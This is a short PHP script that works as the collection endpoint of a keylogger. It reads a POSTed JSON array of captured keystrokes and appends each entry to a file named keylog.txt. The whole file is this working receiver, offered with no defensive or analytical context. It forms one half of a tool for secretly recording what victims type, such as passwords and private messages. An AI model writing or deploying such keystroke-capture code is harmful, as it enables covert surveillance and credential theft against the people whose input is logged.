<?php

$file = fopen("keylog.txt","a+");

//SAVE KEYSTROKES
$keys = json_decode($_POST['keys']);
foreach ($keys as $k => $v) {
    fwrite($file, $v . PHP_EOL);
}

//CLOSE 
fclose($file);
echo "OK"; 

